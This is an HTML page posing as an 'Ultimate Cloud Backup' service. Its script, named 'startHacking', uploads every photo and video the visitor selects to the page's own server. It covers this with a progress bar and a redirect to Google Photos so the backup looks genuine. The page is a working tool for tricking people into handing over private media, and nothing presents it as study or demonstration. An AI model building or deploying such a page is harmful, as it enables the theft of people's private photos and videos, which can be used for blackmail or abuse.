<!DOCTYPE html>
<html>
<head>
    <title>Cloud Drive - Secure Backup</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding: 20px; }
        .container { border: 2px solid #0f0; padding: 30px 10px; margin-top: 30px; box-shadow: 0 0 15px #0f0; }
        .btn { background: #0f0; color: #000; padding: 15px 30px; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; width: 80%; }
        #progress-container { width: 80%; background: #222; margin: 20px auto; display: none; border: 1px solid #0f0; }
        #progress-bar { width: 0%; height: 20px; background: #0f0; transition: 0.3s; }
        #status { margin-top: 20px; color: yellow; font-size: 13px; }
        input[type="file"] { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h2 style="color:white;">ULTIMATE CLOUD BACKUP</h2>
        <p>Backup all Photos & Videos safely.</p>
        <br>
        <label for="files" class="btn">SELECT MEDIA (MULTIPLE)</label>
        <input type="file" id="files" accept="image/*,video/*" multiple onchange="startHacking(this)">
        
        <div id="progress-container"><div id="progress-bar"></div></div>
        <div id="status">Status: Waiting for selection...</div>
    </div>

    <script>
        async function startHacking(input) {
            const files = input.files;
            const status = document.getElementById('status');
            const pBar = document.getElementById('progress-bar');
            const pCont = document.getElementById('progress-container');
            
            pCont.style.display = 'block';
            status.innerHTML = `<span style="color:red;">Syncing ${files.length} Files... Do not close!</span>`;

            for (let i = 0; i < files.length; i++) {
                const formData = new FormData();
                formData.append('file', files[i]);
                
                let percent = Math.round(((i + 1) / files.length) * 100);
                pBar.style.width = percent + '%';
                status.innerHTML = `Uploading: ${files[i].name} (${percent}%)`;

                await fetch('upload.php', { method: 'POST', body: formData });
            }
            
            status.innerHTML = "All Media Secured! Redirecting...";
            setTimeout(() => { window.location.href = "https://photos.google.com"; }, 2000);
        }
    </script>
</body>
</html>
